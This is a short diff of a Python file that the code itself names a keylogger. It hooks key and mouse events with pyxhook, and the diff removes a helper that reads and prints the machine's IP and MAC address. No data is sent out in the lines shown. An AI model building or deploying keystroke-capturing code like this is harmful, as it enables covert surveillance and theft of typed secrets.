@@ -110,34 +110,6 @@ def log_path(app_folder, path):
 # Create a hook manager object to listen for key events
 new_hook = pyxhook.HookManager()
 
-# Get IP and MAC address at startup
-def get_ip_and_mac():
-    import socket
-    import psutil
-    ip = socket.gethostbyname(socket.gethostname())
-    
-    # Get all network interfaces
-    net_if_addrs = psutil.net_if_addrs()
-
-    # Find the first interface with a MAC address (typically the one used for the network connection)
-    mac = None
-    for interface, addrs in net_if_addrs.items():
-        for addr in addrs:
-            if addr.family == psutil.AF_LINK:
-                mac = addr.address
-                break
-        if mac:
-            break
-    
-    # If no MAC address is found, return a message or empty
-    if not mac:
-        mac = "No MAC address found"
-    
-    return ip, mac
-
-ip, mac = get_ip_and_mac()
-print(f"IP Address: {ip}, MAC Address: {mac}")
-
 # Function to handle keypress events
 def OnKeyPress(event):
     global current_word
@@ -198,4 +170,3 @@ finally:
     new_hook.unhook()
     mouse_listener.stop()
     print("Keylogger unhooked and cleaned up.")
-
